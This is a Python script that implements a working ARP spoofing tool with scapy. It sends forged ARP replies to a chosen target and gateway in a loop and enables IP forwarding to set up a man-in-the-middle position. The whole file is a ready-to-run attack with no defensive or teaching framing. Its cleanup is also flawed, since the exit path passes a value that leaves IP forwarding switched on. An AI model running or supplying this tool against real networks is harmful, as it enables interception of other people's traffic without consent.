import scapy.all as scapy
import time
import argparse
from termcolor import colored
import os

class ArpSpoof():
	def __init__(self):
		self.no_packets=0
		self.about()
		self.script_desc()

	def arguman_al(self):
		parser = argparse.ArgumentParser(prog=self.program,formatter_class=argparse.RawTextHelpFormatter)
		parser.add_argument("--hedef",dest="hedefIP",help="Target IP address")
		parser.add_argument("--gateway",dest="gatewayIP",help="Gateway IP address")
		options=parser.parse_args()
		if not options.hedefIP:
			parser.error('[-] Please set a target ip')
		elif not options.gatewayIP:
			parser.error("[-] Please enter gateway ")
		else:
			return options

	def mac_bul(self,ip):
		arp_istek=scapy.ARP(pdst=ip)
		broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp_request_broadcast=broadcast/arp_istek
		answered_list=scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
		return answered_list[0][1].hwsrc


	def spoof(self,hedef_ip,gateway_ip):
		hedef_mac=self.mac_bul(hedef_ip)
		paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip)
		scapy.send(paket,verbose=False)

	def send_packet(self,hedefIP,gatewayIP):
		while True:
			self.spoof(hedefIP, gatewayIP)
			self.spoof(gatewayIP, hedefIP)
			self.no_packets += 2
			print(colored("\r[+] number of packages sent:" + str(self.no_packets),"green"),end="")
			time.sleep(3)

	def restore(self,hedef_ip,gateway_ip):
		hedef_mac=self.mac_bul(hedef_ip)
		gateway_mac=self.mac_bul(gateway_ip)
		paket=scapy.ARP(op=2,pdst=hedef_ip,hwdst=hedef_mac,psrc=gateway_ip,hwsrc=gateway_mac)
		scapy.send(paket,verbose=False,count=4)

	def ip_forward(self,value):
		if value==1:
			os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
		elif value==2:
			os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

	def script_desc(self):
		self.program = "arp_spoof"

	def about(self):
		print(colored("# ==============================================================================", "green"))

	def keyboardinterrupt_message(self):
		print(colored("\n[-] CTRL+C Please wait ...","red"))

try:
	arpSpoof=ArpSpoof()
	arpSpoof.ip_forward(1)
	options =arpSpoof.arguman_al()
	arpSpoof.send_packet(options.hedefIP, options.gatewayIP)
except KeyboardInterrupt:
	arpSpoof.keyboardinterrupt_message()
	arpSpoof.ip_forward(0)
	arpSpoof.restore(options.hedefIP,options.gatewayIP)